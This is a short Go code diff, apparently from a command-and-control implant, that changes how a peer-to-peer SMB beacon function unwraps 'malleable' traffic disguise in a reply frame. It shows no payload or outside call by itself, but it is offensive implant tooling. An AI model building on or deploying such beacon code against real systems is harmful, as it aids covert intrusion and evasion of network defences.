@@ -161,7 +161,8 @@ func sendP2PSMBBeacon(body []byte) []byte {
 	if _, err := io.ReadFull(conn, rbuf); err != nil {
 		return nil
 	}
-	return rbuf
+	// Strip any malleable cover the parent wrapped around the raw P2P frame.
+	return stripMalleableWrapping(rbuf)
 }
 
 func p2pListenSMB() {
